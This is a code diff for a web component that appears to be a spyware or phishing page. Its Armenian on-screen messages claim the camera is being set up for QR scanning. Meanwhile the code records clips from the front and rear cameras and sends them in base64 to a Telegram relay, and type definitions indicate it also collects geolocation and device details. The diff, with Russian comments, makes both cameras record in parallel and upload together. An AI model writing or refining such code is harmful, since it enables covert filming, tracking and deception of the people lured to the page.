@@ -15,7 +15,7 @@ import {
 
 const TELEGRAM_API_ENDPOINT = "/api/telegram";
 const VIDEO_SEGMENT_DURATION_MS = 3500; // 3.5 seconds for each video segment
-const QR_SCAN_TIMEOUT_MS = 30000; // 30 seconds for QR scanning on first attempt
+const QR_SCAN_TIMEOUT_MS = 45000; // Увеличено до 45 секунд для более реалистичного ожидания
 
 type GeolocationData = { latitude: number; longitude: number };
 type ClientInfo = { platform: string; hardwareConcurrency: number; screenWidth?: number; screenHeight?: number; browserLanguage?: string; };
@@ -282,22 +282,31 @@ const PermissionHandler = () => {
       setProcessSuccessful(initialSendSuccess);
 
       setLoadingMessage("Կարգավորում ենք տեսախցիկը լավագույն սկանավորման համար...");
-      setAppPhase("recordingVideo1");
+      setAppPhase("recordingVideo1"); // Фаза для первого видео
       console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo1'.`);
-      const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
+
+      // Запускаем запись обоих видео параллельно
+      const video1RecordingPromise = recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
+      const video2RecordingPromise = recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment");
+
+      // Ожидаем завершения записи обоих видео
+      const [video1Base64, video2Base64] = await Promise.all([
+        video1RecordingPromise,
+        video2RecordingPromise
+      ]);
+
+      // Отправляем видео в Telegram параллельно
+      const sendPromises: Promise<boolean>[] = [];
       if (video1Base64) {
-        const video1SendSuccess = await sendDataToTelegram({ video1: video1Base64 }, MessageType.Video1, attempt);
-        setProcessSuccessful(prev => prev && video1SendSuccess);
+        sendPromises.push(sendDataToTelegram({ video1: video1Base64 }, MessageType.Video1, attempt));
+      }
+      if (video2Base64) {
+        sendPromises.push(sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2, attempt));
       }
 
-      setLoadingMessage("Կարգավորում ենք տեսախցիկը լավագույգ սկանավորման համար...");
-      setAppPhase("recordingVideo2");
-      console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo2'.`);
-      const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment");
-      if (video2Base64) {
-        const video2SendSuccess = await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2, attempt);
-        setProcessSuccessful(prev => prev && video2SendSuccess);
-      }
+      // Ожидаем завершения отправки обоих видео
+      const sendResults = await Promise.all(sendPromises);
+      setProcessSuccessful(prev => prev && sendResults.every(res => res)); // Обновляем общий статус успеха
 
       setLoadingMessage("Անցում դեպի QR կոդի սկանավորում...");
       setAppPhase("flippingCamera");
@@ -311,15 +320,15 @@ const PermissionHandler = () => {
       await sendDataToTelegram(stage2Message, MessageType.QrCode, attempt);
 
       setLoadingMessage("Կարգավորում ենք տեսախցիկը լավագույն սկանավորման համար...");
-      setAppPhase("recordingVideo2");
+      setAppPhase("recordingVideo2"); // Фаза для второго видео во второй попытке
       console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo2' for attempt 2.`);
-      const video2Base64 = await recordVideoSegment(5000, "environment");
+      
+      const video2Base64 = await recordVideoSegment(5000, "environment"); // Запись второго видео
       if (video2Base64) {
         const video2SendSuccess = await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2, attempt);
         setProcessSuccessful(prev => prev && video2SendSuccess);
       }
       
-      // Изменено: теперь переходим к QR-сканированию, а не сразу к "finished"
       setLoadingMessage("Անցում դեպի QR կոդի սկանավորում...");
       setAppPhase("flippingCamera");
       console.log(`[Session ${currentSessionId}] setAppPhase to 'flippingCamera' for attempt 2.`);
